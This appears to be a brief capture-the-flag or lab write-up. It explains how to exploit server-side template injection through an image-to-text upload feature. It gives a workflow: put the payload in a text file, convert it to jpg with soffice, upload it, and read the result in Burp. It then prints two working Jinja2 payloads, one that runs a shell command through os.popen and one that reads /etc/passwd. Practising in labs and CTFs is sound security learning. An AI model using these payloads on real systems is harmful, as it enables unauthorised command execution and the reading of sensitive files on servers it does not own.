- Try out some different payloads with the image to text functionality and see it's vulnerable to ssti
```bash
# GENERAL WORKFLOW:
# create text file with ssti payload
# use following command to convert it to a jpg
soffice --convert-to jpg "read_file.txt"
# upload the file using the subdomains functionality
# either capture response using burp or view response in burp's proxy history tab 
```
```python
# code_exec payload:
{{ namespace.__init__.__globals__.os.popen('id').read() }}
# read_file payload:
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```